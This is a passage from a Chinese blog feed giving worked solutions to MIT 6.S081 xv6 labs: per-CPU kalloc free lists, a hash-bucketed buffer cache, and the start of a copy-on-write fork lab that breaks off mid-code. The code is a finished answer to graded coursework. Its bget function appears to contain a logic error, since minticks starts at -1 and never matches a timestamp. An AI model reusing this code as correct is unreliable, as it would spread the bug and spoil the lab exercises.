bcache locks.</span><br><span class="line"></span><br><span class="line">For this lab, you must use a dedicated unloaded machine with multiple cores. If you use a machine that is doing other things, the counts that kalloctest prints will be nonsense. You can use a dedicated Athena workstation, or your own laptop, but don&#x27;t use a dialup machine.</span><br><span class="line"></span><br><span class="line">The root cause of lock contention in kalloctest is that kalloc() has a single free list, protected by a single lock. To remove lock contention, you will have to redesign the memory allocator to avoid a single lock and list. The basic idea is to maintain a free list per CPU, each list with its own lock. Allocations and frees on different CPUs can run in parallel, because each CPU will operate on a different list. The main challenge will be to deal with the case in which one CPU&#x27;s free list is empty, but another CPU&#x27;s list has free memory; in that case, the one CPU must &quot;steal&quot; part of the other CPU&#x27;s free list. Stealing may introduce lock contention, but that will hopefully be infrequent.</span><br></pre></td></tr></table></figure>

<ul>
<li>题目提示由于目前实现的<code>kalloc</code>所有的线程都共享一把锁, 此时如何所有的线程在<code>heap</code>上申请时会造成冲突, 从而都在锁上进行自旋, 从而进行等待,题目要求优化<code>kalloc</code>,减少<code>lock accquire</code>时的冲突. 题目也给了思路, 就是为每个线程建立一个<code>memory pool</code>, 每个线程的内存申请都发生在自身的<code>memory pool</code>, 当如果自身的<code>memory pool</code>用完时,则从其他线程的<code>memory pool</code>中进行<code>steal</code>操作.</li>
<li>本身比较简单, 但是需要注意的几个细节:<ul>
<li><code>kalloc</code>模块对外提供的接口不变, 每次进行<code>alloc</code>操作时, 首先需要获取当前线程的<code>cpuid</code>的信息, 可以通过寄存器读取即可获取,<code>xv6</code>中已经封装好接口<code>cpuid()</code>,但是调用该接口时,需要关闭中断, 读取完成后, 还需要开启中断.</li>
<li>进行<code>steal</code>操作时, 需要防止死锁.</li>
<li>初始化时, 可以将所有未使用的内存都挂载在<code>cpu 0</code>上.</li>
</ul>
</li>
</ul>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><code>memory</code>初始化:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *freelist;</span><br><span class="line">  <span class="type">int</span>  freesize;</span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">&#125; kmem[NCPU];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU; ++i) &#123;</span><br><span class="line">  	<span class="built_in">snprintf</span>(kmem[i].name, <span class="number">16</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;kmem&quot;</span>, i);</span><br><span class="line">	<span class="built_in">initlock</span>(&amp;kmem[i].lock, kmem[i].name);</span><br><span class="line">	kmem[i].freelist = <span class="number">0</span>;</span><br><span class="line">	kmem[i].freesize = <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="comment">// we wiil alloc each cup heap lock and list</span></span><br><span class="line">  <span class="built_in">freerange</span>(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>kfree</code>操作:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Free the page of physical memory pointed at by v,</span></span><br><span class="line"><span class="comment">// which normally should have been returned by a</span></span><br><span class="line"><span class="comment">// call to kalloc().  (The exception is when</span></span><br><span class="line"><span class="comment">// initializing the allocator; see kinit above.)</span></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *r;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">  <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line">  r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//add this block to the free list</span></span><br><span class="line">  <span class="built_in">push_off</span>();</span><br><span class="line">  <span class="type">int</span> hart = <span class="built_in">cpuid</span>();</span><br><span class="line">  <span class="built_in">pop_off</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">acquire</span>(&amp;kmem[hart].lock);</span><br><span class="line">  r-&gt;next = kmem[hart].freelist;</span><br><span class="line">  kmem[hart].freelist = r;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem[hart].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>kalloc</code>操作:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate one 4096-byte page of physical memory.</span></span><br><span class="line"><span class="comment">// Returns a pointer that the kernel can use.</span></span><br><span class="line"><span class="comment">// Returns 0 if the memory cannot be allocated.</span></span><br><span class="line"><span class="function"><span class="type">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">kalloc</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *r;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//add this block to the free list</span></span><br><span class="line">  <span class="built_in">push_off</span>();</span><br><span class="line">  <span class="type">int</span> hart = <span class="built_in">cpuid</span>();</span><br><span class="line">  <span class="built_in">pop_off</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">acquire</span>(&amp;kmem[hart].lock);</span><br><span class="line">  r = kmem[hart].freelist;</span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">  	kmem[hart].freelist = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem[hart].lock);</span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="comment">// we steal memory from other cpus</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NCPU; ++i) &#123;</span><br><span class="line">		<span class="built_in">acquire</span>(&amp;kmem[i].lock);</span><br><span class="line">		r = kmem[i].freelist;</span><br><span class="line">		<span class="keyword">if</span>(r) &#123;</span><br><span class="line">			kmem[i].freelist = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">release</span>(&amp;kmem[i].lock);</span><br><span class="line">		<span class="keyword">if</span>(r) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Buffer-cache"><a href="#Buffer-cache" class="headerlink" title="Buffer cache"></a>Buffer cache</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This half of the assignment is independent from the first half; you can work on this half (and pass the tests) whether or not you have completed the first half.</span><br><span class="line"></span><br><span class="line">If multiple processes use the file system intensively, they will likely contend for bcache.lock, which protects the disk block cache in kernel/bio.c. bcachetest creates several processes that repeatedly read different files in order to generate contention on bcache.lock; its output looks like this (before you complete this lab):</span><br><span class="line"></span><br><span class="line">$ bcachetest</span><br><span class="line">start test0</span><br><span class="line">test0 results:</span><br><span class="line">--- lock kmem/bcache stats</span><br><span class="line">lock: kmem: #fetch-and-add 0 #acquire() 33035</span><br><span class="line">lock: bcache: #fetch-and-add 16142 #acquire() 65978</span><br><span class="line">--- top 5 contended locks:</span><br><span class="line">lock: virtio_disk: #fetch-and-add 162870 #acquire() 1188</span><br><span class="line">lock: proc: #fetch-and-add 51936 #acquire() 73732</span><br><span class="line">lock: bcache: #fetch-and-add 16142 #acquire() 65978</span><br><span class="line">lock: uart: #fetch-and-add 7505 #acquire() 117</span><br><span class="line">lock: proc: #fetch-and-add 6937 #acquire() 73420</span><br><span class="line">tot= 16142</span><br><span class="line">test0: FAIL</span><br><span class="line">start test1</span><br><span class="line">test1 OK</span><br><span class="line">You will likely see different output, but the number of acquire loop iterations for the bcache lock will be high. If you look at the code in kernel/bio.c, you&#x27;ll see that bcache.lock protects the list of cached block buffers, the reference count (b-&gt;refcnt) in each block buffer, and the identities of the cached blocks (b-&gt;dev and b-&gt;blockno).</span><br></pre></td></tr></table></figure>
<ul>
<li>这个题目要求实现磁盘的<code>cache</code>的优化, 之前所有的设备请求都挂在一个链式的<code>cahce</code>上.所有针对磁盘的<code>block</code>请求读写全部共享一把锁, 这就必然会造成锁的请求冲突, 从而影响读写效率, 现在要求对读写的<code>cache buffer</code>进行优化, 从而降低锁的请求冲突, 从而提升效率.细节实现如下:<ul>
<li>题目中最关键的提示使用<code>hash table</code>,对应于不同的<code>block</code>请求通过<code>hash</code>映射到不同的<code>buffer</code>中, 从而降低锁的冲突. 当<code>hash</code>对应的<code>bucket</code>用完时, 则需要从别的<code>bucket</code>中未使用的<code>buffer</code>中<code>steal</code>一些.实际采用链式<code>hash</code>即可, 即每个<code>bucket</code>存储的是<code>buffer</code>的<code>list</code>.</li>
<li>题目中最需要值得处理的细节是, 即同一个<code>dev</code>和<code>block</code>对应的<code>buffer</code>具有唯一性, 这样保证不同的线程读取或者写入的<code>blcok</code>的<code>cache buffer</code>是同一个, 这样就能保证原子性, 否则则会出现读写不一致的问题, 这点也是本<code>lab</code>比较难处理的地方.</li>
<li>具体实现时, 我们需要对<code>hash table</code>的每个<code>bucket</code>进行加锁操作, 当对该<code>bucket</code>操作时, 则需要获取锁, 操作完成后, 需要释放该锁.但是如何保证每个唯一的<code>dev</code>和<code>block</code>对应的唯一性的<code>buffer</code>,则需要处理稍微麻烦一些, 首先我们查找该<code>block</code>对应的<code>bucket</code>是否对应其含有的<code>dev</code>和<code>block</code>, 如果已经含有表示其已经进行缓存了, 则直接进行返回查找到的<code>buffer</code>即可; 否则我们先获取全局锁，再获取该<code>bucket</code>对应的锁, 再次再该<code>bucket</code>中进行查找一遍, 是否有存在该<code>block</code>对应的<code>buffer</code>缓存, 这样做的目的是为了防止, <code>bucket</code>释放锁到获取全局锁之间的这段时间中, 是否有其他的线程将该<code>block</code>对应的<code>buffer</code>进行了更新, 从而保证<code>block</code>对应的<code>buffer</code>的唯一性.我们在所有的<code>bucket</code>中找到一个最久且未使用的<code>buffer</code>分配给该<code>block</code>, 然后将该<code>buffer</code>移动到该<code>block</code>对应的<code>bucket</code>中.这样就完成了<code>steal</code>的操作.</li>
<li>我们查找时优先从该<code>bucket</code>找到一个未使用的<code>buffer</code>, 如果未找到则从其他的<code>bucket</code>中进行查找即可.</li>
<li>题目中很容易出的问题是会报<code>panic: freeing free block</code>的错误, 这个可能是之前的代码错误导致文件系统<code>fs</code>中的<code>block</code>存在错误, 解决办法是执行<code>maka clean</code>操作, 从新编译一遍文件系统<code>fs</code>即可.</li>
</ul>
</li>
</ul>
<h3 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h3><ul>
<li><p>从新定义<code>bcache</code>的结构, 采用<code>hashtable</code>的方式存储<code>buf</code>信息.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_HASH_BUCKETS 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL 0</span></span><br><span class="line"><span class="keyword">extern</span> uint ticks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> buf[NBUF]; </span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> lock;</span><br><span class="line">  <span class="comment">// hash table </span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">spinlock</span> hashlock[MAX_HASH_BUCKETS];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> hashtable[MAX_HASH_BUCKETS];</span><br><span class="line">  <span class="comment">// Linked list of all buffers, through prev/next.</span></span><br><span class="line">  <span class="comment">// Sorted by how recently the buffer was used.</span></span><br><span class="line">  <span class="comment">// head.next is most recent, head.prev is least.</span></span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure></li>
<li><p>初始化<code>bcache</code>操作, 此时我们需要初始化每个<code>bucket</code>对应的锁,并初始化每个<code>bucket</code>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">binit</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">buf</span> *b;</span><br><span class="line">	<span class="comment">// init buffer lock and init free list buffer</span></span><br><span class="line">	<span class="comment">// initial the hash table and hash lock</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_HASH_BUCKETS; ++i) &#123;</span><br><span class="line">		<span class="built_in">initlock</span>(&amp;bcache.hashlock[i], <span class="string">&quot;hashlock&quot;</span>);</span><br><span class="line">		<span class="comment">// Create linked list of buffers</span></span><br><span class="line">		bcache.hashtable[i].prev = &amp;bcache.hashtable[i];</span><br><span class="line">		bcache.hashtable[i].next = &amp;bcache.hashtable[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">initlock</span>(&amp;bcache.lock, <span class="string">&quot;bcache&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(b = bcache.buf; b &lt; bcache.buf + NBUF; b++)&#123;</span><br><span class="line">		<span class="built_in">initsleeplock</span>(&amp;b-&gt;lock, <span class="string">&quot;bufferlock&quot;</span>);</span><br><span class="line">		b-&gt;timestamp = <span class="number">0</span>;</span><br><span class="line">		b-&gt;dev = <span class="number">-1</span>;</span><br><span class="line">		b-&gt;blockno = <span class="number">-1</span>;</span><br><span class="line">		b-&gt;refcnt = <span class="number">0</span>;</span><br><span class="line">		b-&gt;next = bcache.hashtable[<span class="number">0</span>].next;</span><br><span class="line">		b-&gt;prev = &amp;bcache.hashtable[<span class="number">0</span>];</span><br><span class="line">		bcache.hashtable[<span class="number">0</span>].next-&gt;prev = b;</span><br><span class="line">		bcache.hashtable[<span class="number">0</span>].next = b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>查找<code>block</code>对应的<code>buffer</code>时, 操作稍微麻烦一些.　我们首先在<code>bucket</code>中进行查找, 然后获取全局锁, 从其他的<code>bucket</code>中的查找一个未使用的<code>buffer</code>.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Look through buffer cache for block on device dev.</span></span><br><span class="line"><span class="comment">// If not found, allocate a buffer.</span></span><br><span class="line"><span class="comment">// In either case, return locked buffer.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">buf</span>*</span><br><span class="line"><span class="built_in">bget</span>(uint dev, uint blockno)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> *b;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">buf</span> * lrub = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> minticks = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">int</span> no = <span class="built_in">bhash</span>(blockno);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">acquire</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">  <span class="comment">// Is the block already cached?</span></span><br><span class="line">  <span class="keyword">for</span>(b = bcache.hashtable[no].next; b != &amp;bcache.hashtable[no]; b = b-&gt;next)&#123;</span><br><span class="line">	<span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">      <span class="built_in">acquiresleep</span>(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Not cached.</span></span><br><span class="line">  <span class="comment">// Recycle the least recently used (LRU) unused buffer.</span></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;bcache.lock);</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">  <span class="keyword">for</span>(b = bcache.hashtable[no].next; b != &amp;bcache.hashtable[no]; b = b-&gt;next)&#123;</span><br><span class="line">	<span class="keyword">if</span>(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno)&#123;</span><br><span class="line">      b-&gt;refcnt++;</span><br><span class="line">      <span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">	  <span class="built_in">release</span>(&amp;bcache.lock);</span><br><span class="line">      <span class="built_in">acquiresleep</span>(&amp;b-&gt;lock);</span><br><span class="line">      <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span> &amp;&amp; minticks &gt;= b-&gt;timestamp) &#123;</span><br><span class="line">		lrub = b;</span><br><span class="line">		minticks = b-&gt;timestamp;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lrub) &#123;</span><br><span class="line">  	lrub-&gt;dev = dev;</span><br><span class="line">	lrub-&gt;blockno = blockno;</span><br><span class="line">    lrub-&gt;valid = <span class="number">0</span>;</span><br><span class="line">	lrub-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">	<span class="built_in">release</span>(&amp;bcache.lock);</span><br><span class="line">    <span class="built_in">acquiresleep</span>(&amp;lrub-&gt;lock);</span><br><span class="line">	<span class="keyword">return</span> lrub;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// we steal a buffer block from other buckets</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; MAX_HASH_BUCKETS; ++i) &#123;</span><br><span class="line">	<span class="type">int</span> newno = <span class="built_in">bhash</span>(no + i);</span><br><span class="line">	<span class="built_in">acquire</span>(&amp;bcache.hashlock[newno]);</span><br><span class="line">  	<span class="keyword">for</span> (b = bcache.hashtable[newno].prev; b != &amp;bcache.hashtable[newno]; b = b-&gt;prev)&#123;</span><br><span class="line">		<span class="keyword">if</span>(b-&gt;refcnt == <span class="number">0</span> &amp;&amp; minticks &gt;= b-&gt;timestamp) &#123;</span><br><span class="line">			lrub = b;</span><br><span class="line">			minticks = b-&gt;timestamp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lrub) &#123;</span><br><span class="line">	  	lrub-&gt;dev = dev;</span><br><span class="line">		lrub-&gt;blockno = blockno;</span><br><span class="line">	    lrub-&gt;valid = <span class="number">0</span>;</span><br><span class="line">		lrub-&gt;refcnt = <span class="number">1</span>;</span><br><span class="line">		lrub-&gt;next-&gt;prev = lrub-&gt;prev;</span><br><span class="line">		lrub-&gt;prev-&gt;next = lrub-&gt;next;</span><br><span class="line">		lrub-&gt;next = bcache.hashtable[no].next;</span><br><span class="line">		lrub-&gt;prev = &amp;bcache.hashtable[no];</span><br><span class="line">		bcache.hashtable[no].next-&gt;prev = lrub;</span><br><span class="line">    	bcache.hashtable[no].next = lrub;</span><br><span class="line">		<span class="built_in">release</span>(&amp;bcache.hashlock[newno]);</span><br><span class="line">		<span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">		<span class="built_in">release</span>(&amp;bcache.lock);</span><br><span class="line">	    <span class="built_in">acquiresleep</span>(&amp;lrub-&gt;lock);</span><br><span class="line">		<span class="keyword">return</span> lrub;</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="built_in">release</span>(&amp;bcache.hashlock[newno]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// we check the the cache again and the one block must atomic  </span></span><br><span class="line">  <span class="built_in">panic</span>(<span class="string">&quot;bget: no buffers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>释放<code>buffer</code>时, 则我们需要记录该<code>buffer</code>的<code>timestamp</code>,用于<code>lru</code>算法.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Release a locked buffer.</span></span><br><span class="line"><span class="comment">// Move to the head of the most-recently-used list.</span></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">brelse</span><span class="params">(<span class="keyword">struct</span> buf *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">holdingsleep</span>(&amp;b-&gt;lock))</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;brelse&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">releasesleep</span>(&amp;b-&gt;lock);</span><br><span class="line">  <span class="type">int</span> no = <span class="built_in">bhash</span>(b-&gt;blockno);</span><br><span class="line">  <span class="built_in">acquire</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">  b-&gt;refcnt--;</span><br><span class="line">  <span class="keyword">if</span> (b-&gt;refcnt == <span class="number">0</span>) &#123;</span><br><span class="line"> 	b-&gt;timestamp = <span class="built_in">btime</span>();</span><br><span class="line">  &#125; 	</span><br><span class="line">  <span class="built_in">release</span>(&amp;bcache.hashlock[no]);</span><br><span class="line">  <span class="comment">// bdegub();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">bhash</span><span class="params">(<span class="type">int</span> blockno)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> blockno%MAX_HASH_BUCKETS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">btime</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ticks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul>
<li>通过这一章的学习，其实给了许多可以思考的地方，从本质上思考锁的作用和原理，以及<code>sleep</code>和<code>wakeup</code>的实现原理，非常简洁而又优雅的实现方式.</li>
<li>下一步计划:</li>
<li><ul>
<li>完成<code>option chanllenge</code>的<code>project</code>;</li>
</ul>
</li>
<li><ul>
<li>仔细研究一下无锁队列的实现，在<code>xv6</code>中添加无锁队列;</li>
</ul>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab6 cow pages</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/60/</url>
    <content><![CDATA[<h1 id="cow-pages"><a href="#cow-pages" class="headerlink" title="cow pages"></a>cow pages</h1><p>感觉<code>cow lab</code>是我做的最纠结的<code>lab</code>了，代码量其实非常少，但是就是非常见简单的<code>20</code>~&#96;30<code>行代码，就出了许多莫名奇妙的</code>bug<code>。</code>copy on write page<code>实现原理非常简单，父进程在创建子进程时，子进程只需要将父进程的所有的虚拟地址</code>拷贝&#96;一份即可,此时子进程与父进程共享同样的物理页，子进程和父进程可以同时读取同样的物理页面；当子进程或者父进程需要将数据写回物理页时，则申请一块新的物理页，并将虚拟地址重新映射到新的物理页上。这样实现的好处有两点：</p>
<ul>
<li>可以节省内存，此时子进程与父进程可以有多个进行共享只读的物理页面，从而减少物理内存的使用。</li>
<li>可以加快子进程的创建效率，此时子进程不需要再重新申请物理页面，从而可以加快子进程的创建速度。<br>在这个<code>lab</code>实现的时候真心遇到各种坑，熬了不少夜，很多莫名奇妙的<code>bug</code>总是出现，可以记录下出现的各种<code>bug</code>。</li>
<li>出现<code>page fault</code>，且<code>scause = 2</code>，表示出现了错误的指令。</li>
<li>出现<code>page fault</code>,且<code>scause = 12</code>,表示出现了加载页面失败的错误。</li>
<li>程序在单核模式下运行正确，但在多核模式下就各种奇怪的问题。</li>
<li>程序莫名奇妙出现陷入死循环，卡住不动。<br><img src="https://i.loli.net/2021/09/02/rUC6nqydHvie1ND.png"><br><a href="https://github.com/mike-box/MIT6.S081/tree/main/lab-cow-handin">git repo</a></li>
</ul>
<h2 id="Implement-copy-on-write"><a href="#Implement-copy-on-write" class="headerlink" title="Implement copy-on write"></a>Implement copy-on write</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your task is to implement copy-on-write fork in the xv6 kernel. You are done if your modified kernel executes both the cowtest and usertests programs successfully.</span><br></pre></td></tr></table></figure>
<p>代码实现的话，总共分为四个部门:</p>
<ul>
<li><code>uvmcopy</code>时，此时我们需要将子进程的页表项中的所有虚拟地址全部映射到父进程的物理页面里面。</li>
<li><code>copyout</code>时，此时因为在系统内部调用文件读写时，此时则是通过<code>copy out</code>和<code>copy in</code>来实现的，此时我们则需要判断当前的页面是否为<code>cow page</code>，如果为<code>cow page</code>则需要重新申请物理内存页面，然后重新写入数据。h’t’y’y’y’y’y’y’y’y’y’y’y’y’y’y’y’y’y </li>
<li><code>usertrap</code>：在发生写入没有写权限的页面时，就会处罚<code>page fault</code>的<code>trap</code>，此时我们需要申请新的物理页面然后映射到虚拟地址上，然后再次重新执行该指令。</li>
<li><code>kalloc</code>: 在进行<code>kalloc</code>和<code>kfree</code>时，我们增加对物理页面内存的引用计数，如果一个物理页面被映射到多个虚拟地址上，则每增加一次映射，则将计数进行增加，每次进行<code>free</code>操作时，我们则将引用进行进行较少，当引用计数为<code>0</code>时，此时我们可以释放该物理页面，并进行回收。</li>
</ul>
<ol>
<li><code>usertrap</code>: 添加对trap的处理<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">usertrap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((<span class="built_in">r_sstatus</span>() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  <span class="built_in">w_stvec</span>((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="built_in">r_sepc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">r_scause</span>() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">syscall</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = <span class="built_in">devintr</span>()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">r_scause</span>() == <span class="number">13</span> || <span class="built_in">r_scause</span>() == <span 